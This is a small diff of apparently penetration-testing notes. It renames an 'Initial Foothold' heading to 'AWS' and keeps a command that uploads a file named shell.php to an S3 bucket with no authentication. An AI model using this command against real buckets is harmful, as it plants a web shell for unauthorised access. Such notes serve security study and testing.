@@ -1,4 +1,4 @@
-# 03 - Initial Foothold
+# AWS
 
 ```
 $ aws s3 --no-sign-request cp shell.php s3://<s3_bucket_IP>
